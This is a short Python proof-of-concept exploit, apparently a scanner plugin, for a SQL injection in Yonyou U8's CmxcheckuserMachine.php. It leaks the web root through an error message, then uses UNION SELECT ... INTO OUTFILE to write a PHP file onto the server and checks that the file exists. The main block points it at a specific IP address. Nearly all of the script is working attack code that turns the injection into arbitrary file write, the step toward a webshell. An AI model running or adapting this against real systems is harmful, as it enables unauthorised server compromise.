#/usr/bin/python
#-*- coding: utf-8 -*-

"""
POC Name  :  用友优谱u8系统cmxcheckuserMachine.php注入导致getshell
Author    :  a
mail      :  a@lcx.cc
 
refer     :http://www.wooyun.org/bugs/wooyun-2015-0130069

"""
import re
import os

def assign(service, arg):
    if service == "yongyou_u8":
        return True, arg    

def audit(arg):
    payload='Server/CmxcheckuserMachine.php?b=1&a=1'
    url = arg + payload
    code1, head1, res1, errcode1, _url1 = curl.curl2(url+'%bf')
    m = re.findall('<b>(.*?)</b>',res1)
    shell_path = str(os.path.dirname(m[1])) + '\\testvul.php'
    shell_path = re.sub(r'\\',r'\\\\',shell_path)
    exp_code = "'%20and%201=2%20union%20select%200x3c3f706870206563686f206d64352831293b756e6c696e6b285f5f46494c455f5f293b3f3e%20into%20outfile%20'{}'%23".format(shell_path)
    code2, head2, res2, errcode2, _url2 = curl.curl2(url+exp_code)
    code3, head3, res3, errcode3, _url3 = curl.curl2(arg+'Server/testvul.php')
    if code3 == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res3: 
        security_hole(url)
            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_u8','http://218.27.137.242:8080/')[1])